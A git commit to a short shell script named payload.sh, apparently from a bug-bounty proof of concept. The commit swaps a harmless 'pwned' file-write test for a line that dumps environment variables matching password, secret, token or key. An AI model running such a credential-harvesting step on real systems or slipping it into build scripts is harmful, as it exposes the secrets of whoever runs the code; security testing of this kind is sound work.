328bec778d16a7067cac976386f6c54818c58ff3
envoybughunter <envoybughunter@gmail.com>
2025-07-01 16:28:45 +0300

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,9 +1,8 @@
 #!/bin/bash
 
-echo "echo 'pwned' > /tmp/pwned.txt" > /tmp/test.sh
-chmod +x /tmp/test.sh
-/tmp/test.sh
-cat /tmp/pwned.txt
+echo "=== POSSIBLE SECRETS ==="
+printenv | grep -iE "password|secret|token|key"
+
 
 
 
